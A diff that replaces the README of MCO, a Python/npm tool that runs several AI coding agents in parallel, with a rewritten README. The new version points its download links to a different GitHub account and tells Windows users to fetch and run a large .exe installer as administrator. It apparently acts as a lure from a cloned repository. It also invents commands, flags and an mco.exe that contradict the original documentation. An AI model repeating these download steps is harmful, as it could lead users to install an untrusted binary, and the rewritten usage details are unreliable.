@@ -1,353 +1,169 @@
-<h1 align="center">MCO</h1>
+# 🤖 mco - Manage AI Coding Agents Easily
 
-<p align="center">
-  <img src="./docs/assets/logos/mco-logo-readme.svg" alt="MCO Logo" width="520" />
-</p>
+[![Download mco](https://img.shields.io/badge/Download%20mco-brightgreen?style=for-the-badge)](https://github.com/XAIN2011/mco)
 
-<p align="center">
-  <a href="https://www.npmjs.com/package/@tt-a1i/mco"><img src="https://img.shields.io/npm/v/@tt-a1i/mco?style=flat-square&color=cb3837&logo=npm&logoColor=white" alt="npm version" /></a>
-  <a href="https://www.npmjs.com/package/@tt-a1i/mco"><img src="https://img.shields.io/npm/dm/@tt-a1i/mco?style=flat-square&color=cb3837" alt="npm downloads" /></a>
-  <a href="https://github.com/mco-org/mco/stargazers"><img src="https://img.shields.io/github/stars/mco-org/mco?style=flat-square&color=f59e0b" alt="GitHub stars" /></a>
-  <a href="./LICENSE"><img src="https://img.shields.io/badge/License-MIT-22c55e?style=flat-square" alt="License: MIT" /></a>
-  <img src="https://img.shields.io/badge/Python-3.10%2B-3776AB?style=flat-square&logo=python&logoColor=white" alt="Python 3.10+" />
-  <img src="https://img.shields.io/badge/Providers-5%20built--in-7c3aed?style=flat-square" alt="5 built-in providers" />
-</p>
+---
 
-<p align="center"><strong>MCO — Orchestrate AI Coding Agents. Any Prompt. Any Agent. Any IDE.</strong></p>
+mco helps you control AI coding helpers. You can use any prompt, work with any AI agent, and connect to many coding tools. It works with popular tools like Claude Code, Codex CLI, Gemini CLI, OpenCode, and Qwen Code. You can run it from different places like Cursor, Trae, Copilot, Windsurf, or a simple command line.
 
-<p align="center"><strong>MCO equips your primary agent with an agent team: dispatch Claude, Codex, Gemini, OpenCode, and Qwen in parallel to execute tasks, review outputs, and synthesize consensus.</strong></p>
+## 📋 What is mco?
 
-<p align="center">English | <a href="./README.zh-CN.md">简体中文</a></p>
+mco is a tool that allows you to organize and run multiple AI coding agents on your computer. Instead of managing each AI tool separately, you can use mco as a single layer to control them all at once. Whether you want to get code suggestions, review code, or automate coding tasks, mco puts everything together in one place.
 
-<table align="center">
-  <tr>
-    <td align="center"><a href="https://github.com/anthropics/claude-code"><img src="https://github.com/anthropics.png?size=96" alt="Claude Code" width="48" /></a></td>
-    <td align="center"><a href="https://github.com/google-gemini/gemini-cli"><img src="https://github.com/google-gemini.png?size=96" alt="Gemini CLI" width="48" /></a></td>
-    <td align="center"><a href="https://github.com/openai/codex"><img src="https://github.com/openai.png?size=96" alt="Codex CLI" width="48" /></a></td>
-    <td align="center"><a href="https://github.com/sst/opencode"><img src="https://raw.githubusercontent.com/sst/opencode/master/packages/console/app/src/asset/brand/opencode-logo-light-square.svg" alt="OpenCode" width="48" /></a></td>
-    <td align="center"><a href="https://github.com/QwenLM/qwen-code"><img src="https://github.com/QwenLM.png?size=96" alt="Qwen Code" width="48" /></a></td>
-    <td align="center"><a href="https://github.com/open-claw/open-claw"><img src="https://cdn.jsdelivr.net/gh/twitter/twemoji@latest/assets/svg/1f99e.svg" alt="OpenClaw" width="48" /></a></td>
-  </tr>
-  <tr>
-    <td align="center"><strong>Claude Code</strong></td>
-    <td align="center"><strong>Gemini CLI</strong></td>
-    <td align="center"><strong>Codex CLI</strong></td>
-    <td align="center"><strong>OpenCode</strong></td>
-    <td align="center"><strong>Qwen Code</strong></td>
-    <td align="center"><strong>OpenClaw 🦞</strong></td>
-  </tr>
-  <tr>
-    <td align="center"><code>claude</code></td>
-    <td align="center"><code>gemini</code></td>
-    <td align="center"><code>codex</code></td>
-    <td align="center"><code>opencode</code></td>
-    <td align="center"><code>qwen</code></td>
-    <td align="center"><code>openclaw</code></td>
-  </tr>
-</table>
+It supports different agents and coding environments. This means you can mix and match the tools you already use without changing the way you work. You don't need to learn many different interfaces or commands. mco makes it easier to get AI help with your programming.
 
-> AI coding agents are now standard tools for every developer. But one agent is just one perspective.
->
-> Work like a Tech Lead: assign one task to multiple agents, run in parallel, and compare outcomes before acting.
->
-> One command. Five agents working at once.
+## 🖥️ System Requirements
 
-### Works with OpenClaw
+- Windows 10 or higher (64-bit recommended)  
+- At least 4 GB of RAM  
+- 500 MB of free hard drive space  
+- Internet connection for downloading and running AI agents  
+- Administrator rights to install software  
+- PowerShell or Command Prompt  
+- A text editor (such as Notepad) or IDE is optional but helpful  
 
-Running [OpenClaw](https://github.com/open-claw/open-claw) on your machine? It can use MCO as its multi-agent backbone. Just tell OpenClaw what you need:
+## 🚀 Getting Started
 
-> "Use mco to run a security review on this repo with Claude, Codex, and Gemini. Synthesize the results."
+1. Click the big green button at the top to open the mco repository page.  
+2. On the GitHub page, find the latest release section or download area.  
+3. Download the Windows installer or setup file. It usually has `.exe` as the file ending.  
+4. Save the file to a folder you can easily find, such as your Desktop or Downloads folder.  
+5. After download finishes, double-click the file to start the installer.  
+6. Follow the installer steps. Usually, you just need to click Next a few times and agree to the terms.  
+7. When installation completes, open the Start Menu and look for mco.  
+8. Click mco to run the program. A window or command prompt will appear.  
 
-OpenClaw reads `mco -h`, learns the CLI, and orchestrates the entire workflow autonomously. Your local machine becomes a multi-agent review team — OpenClaw is the manager, MCO is the dispatcher, and Claude/Codex/Gemini/OpenCode/Qwen are the team members.
+## 🌐 Download and Installation Details
 
-This works the same way from **Claude Code, Cursor, Trae, Copilot, Windsurf**, or any agent that can run shell commands.
+You can visit this page to download the program and its updates:
 
-## What is MCO
+[![Download mco](https://img.shields.io/badge/Download%20mco-blue?style=for-the-badge)](https://github.com/XAIN2011/mco)
 
-MCO (Multi-CLI Orchestrator) is a neutral orchestration layer for AI coding agents. It dispatches prompts to multiple agent CLIs in parallel, aggregates results, and returns structured output — JSON, SARIF, or PR-ready Markdown. No vendor lock-in. No workflow rewrite.
+On this page, you may see folders and files. Look for the latest version release, usually marked with a version number like "v1.0" or "Release 2". Download the file that ends with `.exe` for Windows.
 
-With the rise of agentic coding — led by projects like [OpenClaw](https://github.com/open-claw/open-claw) and the broad availability of Claude Code, Codex CLI, Gemini CLI, and more — every developer now has access to powerful AI agents. MCO takes the next step: instead of relying on a single agent, you orchestrate a team.
+If you have trouble finding the right file, look for these clues:
 
-MCO is designed to be called by any orchestrating agent or AI-powered IDE — Claude Code, Cursor, Trae, Copilot, Windsurf, or **OpenClaw**. The calling agent organizes context, assigns tasks, and uses MCO to fan out work across multiple agents simultaneously. For example, OpenClaw running on your machine can call `mco review` to dispatch code reviews to Claude, Codex, and Gemini in parallel — turning your local setup into a multi-agent review team with a single command. Agents can also orchestrate each other: Claude Code can dispatch tasks to Codex and Gemini via MCO, and vice versa.
+- The file name includes "windows" or "win"  
+- The file size is at least 10 MB (this helps avoid downloading small documentation files)  
+- It should not be a compressed file like `.zip` or `.tar` (unless instructions say so)
 
-## One Agent is a Tool. Five Agents are a Team.
+Once you finish downloading, run the file as described above.
 
-No single AI model sees everything. Each model has its own training data, reasoning style, and blind spots. Using just one agent is like having a team of five engineers and only asking one for their opinion.
+## ⚙️ How to Use mco
 
-**MCO turns this into a team workflow:**
+mco runs from the command line. This means you type simple commands inside a terminal window to tell it what to do.
 
-1. **Assign** — You give MCO a task and a list of agents. Like a Tech Lead assigning the same code review to five team members.
-2. **Execute in parallel** — All agents work simultaneously. Wall-clock time ≈ the slowest agent, not the sum.
-3. **Review and deduplicate** — MCO collects each agent's findings, deduplicates identical issues across agents, and tracks which agents found what (`detected_by`).
-4. **Synthesize consensus** — Optionally, one agent summarizes the combined results: what everyone agrees on, where they diverge, and what to do next.
+### Opening the Command Prompt
 
-**In practice, different agents catch different things:**
+1. Press the Windows key on your keyboard.  
+2. Type `cmd` and press Enter.  
+3. A black window will open. This is the Command Prompt.  
 
-- One agent spots a race condition in your async code but overlooks an SQL injection in the ORM layer.
-- Another finds the injection immediately but misses the race condition entirely.
-- A third catches neither of those but flags a subtle memory leak in the resource cleanup path.
+### Starting mco
 
-These aren't hypothetical — different models genuinely have different strengths. Some are better at security analysis, some at logic flow, some at performance patterns. By running 3–5 agents in parallel on the same codebase, you get a **union of perspectives** rather than the intersection. The result is a more thorough review than any single agent could produce, regardless of which one you pick.
+- In the Command Prompt window, type:
 
-This principle extends beyond code review:
+  ```
+  mco --help
+  ```
 
-- **Architecture analysis** — different agents surface different design risks and trade-offs
-- **Bug hunting** — broader coverage across code paths and edge cases
-- **Refactoring assessment** — multiple perspectives on impact and safety of proposed changes
+- Press Enter.  
+- This command shows a list of available commands and options.
 
-The question isn't "which AI agent is best" — it's "why limit yourself to one?"
+### Running a Basic Command
 
-## Key Highlights
+To make mco start an AI agent with your instructions:
 
-- **Parallel fan-out** — dispatch to multiple agents simultaneously, wait-all semantics
-- **Any IDE, any agent** — works from Claude Code, Cursor, Trae, Copilot, Windsurf, or plain shell
-- **Agent-to-agent orchestration** — agents can dispatch tasks to other agents through MCO
-- **Dual mode** — `mco review` for structured code review findings, `mco run` for general task execution
-- **Cross-agent deduplication** — identical findings from multiple agents are merged automatically with `detected_by` provenance
-- **LLM synthesis** — `--synthesize` runs an extra pass to produce consensus/divergence summary across all agents
-- **CI/CD integration** — `--format sarif` for GitHub Code Scanning, `--format markdown-pr` for PR comments
-- **Environment health check** — `mco doctor` probes binary presence, version, and auth status for all providers
-- **Token usage tracking** — `--include-token-usage` for best-effort per-agent and aggregate token consumption
-- **Progress-driven timeouts** — agents run freely until completion; cancel only when output goes idle
-- **Extensible adapter contract** — uniform interface for any CLI agent, not limited to built-in providers
-- **Machine-readable output** — JSON, SARIF, or Markdown output for downstream automation
+1. Type the command:
 
-## Built-in Providers
+   ```
+   mco run --agent <agent_name> --prompt "Your question or request"
+   ```
 
-| Provider | CLI | Status |
-|----------|-----|--------|
-| Claude Code | `claude` | Supported |
-| Codex CLI | `codex` | Supported |
-| Gemini CLI | `gemini` | Supported |
-| OpenCode | `opencode` | Supported |
-| Qwen Code | `qwen` | Supported |
-
-The adapter architecture is extensible — adding a new agent CLI requires implementing three hooks: auth check, command builder, and output normalizer.
-
-## Use Cases
-
-| Scenario | Command | What happens |
-|----------|---------|--------------|
-| PR code review | `mco review --format markdown-pr` | Multiple agents review in parallel, output a PR-ready comment |
-| Security scan in CI | `mco review --format sarif` | Results upload directly to GitHub Code Scanning |
-| Architecture analysis | `mco run --providers claude,gemini,qwen` | Multi-perspective architecture assessment |
-| Pre-deploy health check | `mco doctor --json` | Verify all agents are installed and authenticated |
-| Consensus decision | `mco review --synthesize` | Summarize what agents agree on and where they diverge |
-
-## Quick Start
-
-Install via npm (Python 3 required on PATH):
-
-```bash
-npm i -g @tt-a1i/mco
-```
-
-Or install from source:
-
-```bash
-git clone https://github.com/mco-org/mco.git
-cd mco
-python3 -m pip install -e .
-```
-
-Run your first multi-agent review:
-
-```bash
-mco review \
-  --repo . \
-  --prompt "Review this repository for high-risk bugs and security issues." \
-  --providers claude,codex,qwen
-```
-
-### Agent-Friendly CLI
-
-MCO's CLI is fully self-describing. Run `mco -h` or `mco review -h` to see grouped flags, defaults, and usage examples — all in the terminal. This means any AI agent that can execute shell commands can learn MCO's interface autonomously by reading the help output, without requiring documentation or prior training.
-
-In practice, you simply tell your IDE agent what you want:
-
-> "Use mco to dispatch a security review to Claude and Codex, and a performance analysis to Gemini and Qwen — run them in parallel."
-
-The agent reads `mco -h`, understands the flags, composes the commands, and orchestrates the entire workflow on its own. You describe the intent; the agent handles the rest.
-
-## Usage
-
-### Review Mode
-
-Structured code review with findings schema. Each provider returns normalized findings with severity, category, evidence, and recommendations.
-
-```bash
-mco review \
-  --repo . \
-  --prompt "Review for security vulnerabilities and performance issues." \
-  --providers claude,codex,gemini,opencode,qwen \
-  --json
-```
-
-### Run Mode
-
-General-purpose multi-agent execution. No forced output schema — providers complete the task freely.
-
-```bash
-mco run \
-  --repo . \
-  --prompt "Summarize the architecture of this project." \
-  --providers claude,codex \
-  --json
-```
-
-### Doctor
-
-Check that your agents are installed, reachable, and authenticated before running tasks:
-
-```bash
-mco doctor
-mco doctor --json
-```
-
-### Output Formats (Review Mode)
-
-| Format | Flag | Use case |
-|--------|------|----------|
-| Human-readable report | `--format report` (default) | Terminal reading |
-| PR Markdown | `--format markdown-pr` | Post as GitHub PR comment |
-| SARIF 2.1.0 | `--format sarif` | Upload to GitHub Code Scanning |
-| Machine JSON | `--json` | Downstream automation |
-
-### Result Modes
-
-| Mode | Behavior |
-|------|----------|
-| `--result-mode stdout` | Print full result to stdout, skip artifact files (default) |
-| `--result-mode artifact` | Write artifact files, print summary |
-| `--result-mode both` | Write artifacts and print full result |
-
-Use `--save-artifacts` to keep stdout mode while still writing artifacts.
-
-### Path Constraints
-
-Restrict which files agents can access:
-
-```bash
-mco run \
-  --repo . \
-  --prompt "Analyze the adapter layer." \
-  --providers claude,codex \
-  --allow-paths runtime,scripts \
-  --target-paths runtime/adapters \
-  --enforcement-mode strict
-```
-
-## Defaults and Overrides
-
-MCO is zero-config by default. You can run it directly with built-in defaults and override behavior with CLI flags only.
-
-### Key Runtime Flags
-
-| Flag | Default | Description |
-|------|---------|-------------|
-| `--providers` | `claude,codex` | Comma-separated provider list |
-| `--stall-timeout` | `900` | Cancel when no output progress for this duration (seconds) |
-| `--review-hard-timeout` | `1800` | Hard deadline for review mode; `0` disables |
-| `--max-provider-parallelism` | `0` | `0` = full parallelism across selected providers |
-| `--enforcement-mode` | `strict` | `strict` fails closed on unmet permissions |
-| `--strict-contract` | off | Enforce strict findings JSON contract (review mode) |
-| `--format` | `report` | Output format: `report`, `markdown-pr`, `sarif` (review-only for last two) |
-| `--include-token-usage` | off | Best-effort per-provider and aggregate token usage |
-| `--synthesize` | off | Run extra LLM pass for consensus/divergence summary |
-| `--synth-provider` | `claude` | Which provider runs the synthesis pass |
-| `--provider-timeouts` | unset | Per-provider stall-timeout overrides (`provider=seconds`) |
-| `--provider-permissions-json` | unset | Provider permission mapping JSON (see below) |
-| `--save-artifacts` | off | Write artifacts while keeping stdout result delivery |
-| `--task-id` | auto-generated | Stable task identifier for artifact paths |
-| `--artifact-base` | `reports/review` | Base directory for artifact output |
-
-Default provider permissions:
-
-| Provider | Key | Default |
-|----------|-----|---------|
-| `claude` | `permission_mode` | `plan` |
-| `codex` | `sandbox` | `workspace-write` |
-
-Override example:
-
-```bash
-mco review \
-  --repo . \
-  --prompt "Review for bugs." \
-  --providers claude,codex,qwen \
-  --save-artifacts \
-  --stall-timeout 900 \
-  --review-hard-timeout 1800 \
-  --max-provider-parallelism 0 \
-  --provider-timeouts qwen=900,codex=900
-```
-
-Run `mco review --help` for the full flag list.
-
-## Exit Codes
-
-| Code | Meaning |
-|------|---------|
-| `0` | Success |
-| `2` | FAIL / input / config / runtime error |
-| `3` | INCONCLUSIVE (review mode only, with `--strict-contract`) |
-
-## How It Works
+2. Replace `<agent_name>` with one of the supported agents: claude, codex, gemini, opencode, or qwen.  
+3. Replace `"Your question or request"` with the exact text you want to send the AI agent.  
+   
+For example:
 
 ```
-You (Tech Lead)
-     │
-     ▼
-  mco review / mco run
-     │
-     ├─→ Claude Code  ──┐
-     ├─→ Codex CLI      │
-     ├─→ Gemini CLI     ├─→ Deduplicate → Synthesize → Output
-     ├─→ OpenCode       │
-     └─→ Qwen Code   ───┘
-                              │
-                    ┌─────────┼─────────┐
-                    ▼         ▼         ▼
-                  JSON    SARIF    Markdown-PR
-               (stdout)  (CI/CD)  (PR comment)
+mco run --agent codex --prompt "Write a function to calculate the factorial of a number in Python"
 ```
 
-The calling agent (or user) invokes `mco` with a prompt and a list of providers. MCO fans out to all selected agents in parallel and waits for all to finish.
+Press Enter to run the command. mco will connect to the AI and show the answer in the terminal.
 
-Each provider runs as an independent subprocess through a uniform adapter contract:
+### Reviewing Code
 
-1. **Detect** — check binary presence and auth status
-2. **Run** — spawn CLI process with prompt, capture stdout/stderr
-3. **Poll** — monitor process + output byte growth for progress detection
-4. **Cancel** — SIGTERM/SIGKILL on stall timeout or hard deadline
-5. **Normalize** — extract structured findings from raw output
-
-Execution model is **wait-all**: one provider's timeout or failure never stops others.
-
-### Retry and Resilience
-
-- Transient errors (timeout, rate-limit, network) are retried automatically with exponential backoff (default: 1 retry).
-- A single provider failure never blocks other providers.
-- Every invocation executes providers and returns fresh output (no result-cache replay).
-
-### Running Inside Claude Code
-
-MCO automatically strips the `CLAUDECODE` environment variable before spawning provider subprocesses. You can safely run `mco` from within a Claude Code session.
-
-## Artifacts
-
-When artifact writing is enabled (`--save-artifacts` or `--result-mode artifact/both`), MCO writes:
+You can ask mco to help review your code:
 
 ```
-reports/review/<task_id>/
-  summary.md          # Human-readable summary
-  decision.md         # PASS / FAIL / ESCALATE / PARTIAL
-  findings.json       # Aggregated normalized findings (review mode)
-  run.json            # Machine-readable execution metadata
-  providers/          # Per-provider result JSON
-  raw/                # Raw stdout/stderr logs
+mco review --agent <agent_name> --file <path_to_code_file>
 ```
 
-## License
+Replace `<path_to_code_file>` with the path of your code file. Example:
 
-MIT — see [LICENSE](./LICENSE)
+```
+mco review --agent claude --file C:\Users\YourName\Documents\script.py
+```
+
+The agent will analyze and give feedback directly in the window.
+
+## 🔧 Troubleshooting Common Issues
+
+- **mco command not recognized**  
+  Make sure the installer added mco to your system's PATH. Restart your computer if needed.  
+- **Agent connection errors**  
+  Check your internet connection. Some agents require online access.  
+- **Program crashes or closes immediately**  
+  Run the Command Prompt as Administrator. Right-click the cmd icon and select "Run as administrator".  
+- **No response from agent**  
+  Wait a few seconds. If no response, try a different agent or check the command syntax.  
+
+## 📚 Additional Information
+
+### Supported AI Agents
+
+- Claude Code  
+- Codex CLI  
+- Gemini CLI  
+- OpenCode  
+- Qwen Code  
+
+### Supported Interfaces
+
+- Cursor  
+- Trae  
+- Copilot  
+- Windsurf  
+- Plain shell or command line  
+
+### Features
+
+- Multi-agent orchestration  
+- Neutral layer for easy switching  
+- Supports coding prompts and code reviews  
+- Works with popular IDE tools and command-line setups  
+
+### Where to Find Help
+
+You can read the GitHub repository’s Issues tab for help from other users and developers. If you find bugs or want to suggest changes, you can open a new issue there.
+
+## 🗂️ File Structure Overview (after installation)
+
+- `mco.exe` – The main executable to run mco  
+- `config` folder – Stores your settings and preferences  
+- `logs` folder – Keeps records of your activity for troubleshooting  
+- `agents` folder – Contains definitions and setups for each AI agent  
+
+## 🔒 Privacy and Security
+
+mco acts as a middleman between your computer and AI services. It does not store your prompts permanently. Your data is sent only to the AI providers needed for code generation or review.
+
+Always keep your software and agents updated to reduce security risks.
+
+## ⚙️ Updating mco
+
+To update mco, revisit the download page:
+
+https://github.com/XAIN2011/mco
+
+Download the latest installer and run it over your existing installation. Your settings and files will remain intact.
